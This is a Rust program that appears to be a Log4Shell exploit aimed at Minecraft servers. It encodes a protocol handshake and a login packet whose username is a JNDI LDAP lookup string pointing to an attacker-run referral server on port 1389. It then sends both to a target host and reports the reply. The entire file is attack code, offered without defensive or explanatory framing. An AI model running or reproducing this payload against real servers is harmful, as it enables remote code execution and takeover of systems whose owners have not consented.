use std::io::{Read, Write};
use std::net::TcpStream;

const HOST: &str = "127.0.0.1"; //target
const PORT: u16 = 25565;
const PROTOCOL: i32 = 340;
const ATTACKER: &str = ""; // LDAPRefServer

fn varint(n: i32) -> Vec<u8> {
    let mut n = n as u32;
    let mut out = Vec::new();
    loop {
        let mut b = (n & 0x7F) as u8;
        n >>= 7;
        if n != 0 {
            b |= 0x80;
            out.push(b);
        } else {
            out.push(b);
            return out;
        }
    }
}

fn pack_string(s: &str) -> Vec<u8> {
    let enc = s.as_bytes();
    let mut out = varint(enc.len() as i32);
    out.extend_from_slice(enc);
    out
}

fn frame(packet_id: i32, body: &[u8]) -> Vec<u8> {
    let mut payload = varint(packet_id);
    payload.extend_from_slice(body);
    let mut out = varint(payload.len() as i32);
    out.extend_from_slice(&payload);
    out
}

fn extend(dst: &mut Vec<u8>, src: Vec<u8>) {
    dst.extend_from_slice(&src);
}

fn main() -> std::io::Result<()> {
    let host = std::env::args().nth(1).unwrap_or_else(|| HOST.to_string());
    let username = format!("${{jndi:ldap://{ATTACKER}:1389/Exploit}}");
    let mut handshake_body: Vec<u8> = Vec::new();
    extend(&mut handshake_body, varint(PROTOCOL));
    extend(&mut handshake_body, pack_string(&host));
    extend(&mut handshake_body, PORT.to_be_bytes());
    extend(&mut handshake_body, varint(2));

    let login_body = pack_string(&username);
    let mut buf = [0u8; 1024];

    let mut stream = TcpStream::connect((host.as_str(), PORT))?;
    stream.write_all(&frame(0x00, &handshake_body))?;
    stream.write_all(&frame(0x00, &login_body))?;

    println!("Exploit packet sent with payload: {username}");
    match stream.read(&mut buf) {
        Ok(n) if n > 0 => {
            println!("Server replied with {} bytes", n);
        }
        _ => println!("No reply read (timeout or closed)"),
    }

    Ok(())
}